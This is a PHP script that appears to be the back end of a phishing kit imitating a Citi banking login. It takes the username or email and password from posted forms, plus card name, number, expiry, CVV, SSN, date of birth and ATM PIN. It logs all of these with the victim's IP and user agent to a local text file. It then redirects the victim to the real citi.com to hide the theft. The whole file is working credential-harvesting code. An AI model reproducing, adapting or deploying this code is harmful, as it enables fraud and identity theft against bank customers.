<?php
include 'email.php';

if (isset($_POST['btn1'])) {
	function get_client_ip()
	{
	    $ipaddress = '';
	    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED'];
	    } else if (isset($_SERVER['REMOTE_ADDR'])) {
	        $ipaddress = $_SERVER['REMOTE_ADDR'];
	    } else {
	        $ipaddress = 'UNKNOWN';
	    }

	    return $ipaddress;
	}

	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$server = date("D/M/d, Y g:i a"); 
	$PublicIP = get_client_ip();
	
file_put_contents("usernames.txt", 
"===================[1]====================
Username    : " . $_POST['ai'] . "
Password    : " . $_POST['pr'] . "
User IP     : ".$PublicIP."
User Agent  : ".$useragent. "
Date & Time : ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."
===================[END]================== \n", FILE_APPEND);
header('Location: ./em.html');


	
	

	
}
else if (isset($_POST['btn3'])) {
	function get_client_ip()
	{
	    $ipaddress = '';
	    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED'];
	    } else if (isset($_SERVER['REMOTE_ADDR'])) {
	        $ipaddress = $_SERVER['REMOTE_ADDR'];
	    } else {
	        $ipaddress = 'UNKNOWN';
	    }

	    return $ipaddress;
	}

	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$server = date("D/M/d, Y g:i a"); 
	$PublicIP = get_client_ip();
	
file_put_contents("usernames.txt", 
"===================[2]====================
Email       : " . $_POST['aiii'] . "
Password    : " . $_POST['prrr'] . "
User IP     : ".$PublicIP."
User Agent  : ".$useragent. "
Date & Time : ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."
===================[END]================== \n", FILE_APPEND);
header('Location: ./account.html');
	
	
	

	
}
else if (isset($_POST['btn2'])) {
	function get_client_ip()
	{
	    $ipaddress = '';
	    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
	        $ipaddress = $_SERVER['HTTP_FORWARDED'];
	    } else if (isset($_SERVER['REMOTE_ADDR'])) {
	        $ipaddress = $_SERVER['REMOTE_ADDR'];
	    } else {
	        $ipaddress = 'UNKNOWN';
	    }

	    return $ipaddress;
	}

	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$server = date("D/M/d, Y g:i a"); 
	$PublicIP = get_client_ip();
	
file_put_contents("usernames.txt", 
"===================[3]====================
Card Name   : " . $_POST['cname'] . "
Card Number : " . $_POST['cnum'] . "
Expire Date : " . $_POST['exdate'] . "
CVV         : " . $_POST['cvv'] . "
SSN         : " . $_POST['ssn'] . "
DOB         : " . $_POST['dob'] . "
ATM Pin     : " . $_POST['pin'] . "
User IP     : ".$PublicIP."
User Agent  : ".$useragent. "
Date & Time : ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."
===================[END]================== \n", FILE_APPEND);
header('Location: https://www.citi.com/');
	

	
}


?>